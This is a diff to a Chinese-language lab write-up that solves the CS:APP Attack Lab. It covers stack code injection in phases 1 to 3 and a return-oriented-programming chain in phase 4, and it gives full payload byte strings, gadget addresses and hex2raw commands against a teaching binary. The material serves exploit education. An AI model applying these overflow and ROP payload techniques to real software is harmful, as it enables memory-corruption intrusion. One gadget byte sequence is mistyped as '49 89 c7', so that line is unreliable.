@@ -2,7 +2,11 @@
 
 做到这个lab才发现有writeup。
 
-## phase_1
+## Part I: Code Injection Attacks
+
+通过注入恶意代码攻击CTARGET
+
+### phase_1
 
 目标是通过注入实现调用touch1函数。
 
@@ -12,7 +16,7 @@
 
 随后`./hex2raw -i touch1.txt | ./ctarget -q`即完成phase_1。
 
-## phase_2
+### phase_2
 
 目标是通过注入代码实现调用touch2并把参数设置成自己的cookie(我的cookie是0x59b997fa）。
 
@@ -56,7 +60,7 @@ Disassembly of section .text:
 
 执行命令`./hex2raw -i touch2.txt | ./ctarget -q `，即完成phase_2.
 
-## phase_3
+### phase_3
 
 writeup中给出了hexmatch函数和touch3函数的c代码，其中hexmatch函数比较unsigned类型的一个参数和char* 指向的字符串的16进制表示是否相同。而touch3在调用hexmatch来比较cookie和传入的字符串参数sval。
 
@@ -106,4 +110,92 @@ Disassembly of section .text:
 ```
 
 对应的字节码是`48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00` ,将其保存为touch3.txt，输入`./hex2raw -i touch3.txt | ./ctarget -q`即通过phase_3.
+
+## Part II: Return-Oriented Programming
+
+RTARGET使用了栈随机化，并将栈在内存中所占部分标记为不可执行，这使得在CTARGET中使用的攻击方法不适用于RTARGET。本部分需要我们使用程序中已有的指令进行攻击。
+
+`The strategy with ROP is to identify byte sequences within an existing program
+that consist of one or more instructions followed by the instruction ret.Such a segment is referred to as a gadget.`
+
+意思是，一段以ret指令结尾的代码被称为gadget。我们可以将栈中的返回地址用若干个gadget的地址覆盖，这样这些gadget的代码就会被依次执行，通过恰当的gadget组合，能够实现我们的攻击。
+
+我们的目标是在提供给我们的gadget farm中找出有用的gadget来实现phase_2和phase_3中的攻击。
+
+### phase_4
+
+要求：通过gadget构建包含以下指令的解答：movq，popq，ret，nop。并且只能用x86-64的前八个寄存器
+
+原先我们要注入的代码如下
+
+```assembly
+movq    $0x59b997fa, %rdi
+pushq   $0x4017ec
+ret
+```
+
+由于cookie没有出现在代码中，我们只好先将cookie注入到栈中，再通过popq指令将其存放至寄存器中。
+
+那么需要执行的指令如下：
+
+```assembly
+popq	%rax
+ret
+movq	%rax, %rdi
+ret
+```
+
+栈长这样
+
+```c
+test{
+    touch2
+    gadget2(movq %rax, %rdi)的地址
+    cookie
+    返回地址{
+        gadget1(popq %rax)的地址
+    }
+}
+getbuf{
+    填满0x28个字节
+}
+```
+
+构造的输入数据就是0x28个字节+gadget1 + cookie + gadget2
+
+去gadget farm中找找popq %rax和movq %rax, %rdi对应的gadget，查writeup末尾的表知popq %rax 对应的字节是58，我们找58 c3对应的指令的地址就行。
+
+但找了一圈还是没找到，只能换个寄存器试试或者找找有没有中间跟着90的指令（对应的是nop）
+
+在汇编代码中找到了
+
+```assembly
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+```
+
+58 90 c3 正好是我们要的，因此gadget1对应的地址是`0x4019ab`.由于是小端法表示，要写成`ab 19 40 00 00 00 00 00`
+
+接下来要把cookie写入栈中，因此后面接的是 `fa 97 b9 59 00 00 00 00 `。
+
+然后找movq  %rax, %rdi，查表知对应的字节码是48 89 c7，同理找一个含有49 89 c7的或是有多余nop的地址就行。这里我找的是
+
+```assembly
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+```
+
+对应的字节码是`c5 19 40 00 00 00 00 00 `
+
+最后还要让程序执行touch2，因此还需要加上字节码`ec 17 40 00 00 00 00 00 `
+
+最终要注入的字节是`00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00`
+
+ 
+
+
+
+
 
